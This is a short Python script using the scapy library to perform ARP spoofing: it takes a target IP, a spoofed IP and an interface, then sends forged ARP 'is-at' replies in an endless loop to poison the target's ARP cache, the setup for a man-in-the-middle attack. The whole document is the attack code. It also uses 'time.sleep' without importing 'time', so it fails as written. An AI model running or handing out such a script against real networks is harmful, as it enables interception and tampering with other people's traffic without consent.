#!/usr/bin/python3

import sys
from scapy.all import sendp, sniff, ARP, Ether

target_ip = sys. argv[1]
fake_ip = sys.argv[2]
iface = sys.argv[3]

ethernet = Ether()

arp = ARP(pdst=target_ip ,
        psrc=fake_ip ,
        op="is-at")

packet = ethernet / arp

while True:
    sendp(packet , iface=iface)
    time.sleep(1)
